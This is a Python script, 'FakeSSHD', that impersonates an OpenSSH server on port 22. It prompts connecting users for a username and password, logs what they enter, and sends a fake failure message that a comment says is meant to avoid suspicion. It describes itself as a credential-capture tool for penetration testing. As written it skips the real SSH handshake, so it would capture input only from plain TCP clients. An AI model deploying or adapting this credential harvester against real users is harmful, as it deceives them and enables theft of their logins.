import argparse
import socket
import threading
import logging
import sys
import time
from datetime import datetime

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('fakesahd.log'),
        logging.StreamHandler(sys.stdout)
    ]
)

class FakeSSHServer:
    def __init__(self, host='0.0.0.0', port=22, banner="SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7"):
        self.host = host
        self.port = port
        self.banner = banner
        self.running = False
        self.server_socket = None

    def handle_client(self, client_socket, client_address):
        """Handle individual client connections."""
        try:
            # Send SSH banner
            client_socket.send(f"{self.banner}\r\n".encode())
            logging.info(f"Connection from {client_address[0]}:{client_address[1]}")

            # Simulate SSH authentication prompt
            client_socket.send(b"login: ")
            username = client_socket.recv(1024).decode().strip()
            client_socket.send(b"Password: ")
            password = client_socket.recv(1024).decode().strip()

            # Log captured credentials
            logging.info(f"Captured from {client_address[0]}: username='{username}', password='{password}'")

            # Send fake authentication failure to avoid suspicion
            client_socket.send(b"Permission denied, please try again.\r\n")
            time.sleep(1)
            client_socket.send(b"Connection closed by remote host.\r\n")

        except Exception as e:
            logging.error(f"Error handling client {client_address[0]}: {str(e)}")
        finally:
            client_socket.close()

    def start(self):
        """Start the fake SSH server."""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            logging.info(f"Fake SSH server started on {self.host}:{self.port}")

            while self.running:
                try:
                    client_socket, client_address = self.server_socket.accept()
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, client_address)
                    )
                    client_thread.start()
                except KeyboardInterrupt:
                    self.stop()
                except Exception as e:
                    logging.error(f"Server error: {str(e)}")

        except Exception as e:
            logging.error(f"Failed to start server: {str(e)}")
            self.stop()

    def stop(self):
        """Stop the fake SSH server."""
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        logging.info("Fake SSH server stopped")

def main():
    parser = argparse.ArgumentParser(description="FakeSSHD - A fake SSH server for capturing credentials in penetration testing.")
    parser.add_argument('-H', '--host', default='0.0.0.0', help='Host to bind the server (default: 0.0.0.0)')
    parser.add_argument('-p', '--port', type=int, default=22, help='Port to bind the server (default: 22)')
    parser.add_argument('-b', '--banner', default="SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7",
                        help='SSH banner to display (default: SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7)')
    parser.add_argument('-q', '--quiet', action='store_true', help='Run in quiet mode (no stdout logging)')

    args = parser.parse_args()

    if args.quiet:
        logging.getLogger().handlers = [logging.FileHandler('fakesahd.log')]

    server = FakeSSHServer(host=args.host, port=args.port, banner=args.banner)
    try:
        server.start()
    except KeyboardInterrupt:
        server.stop()

if __name__ == "__main__":
    main()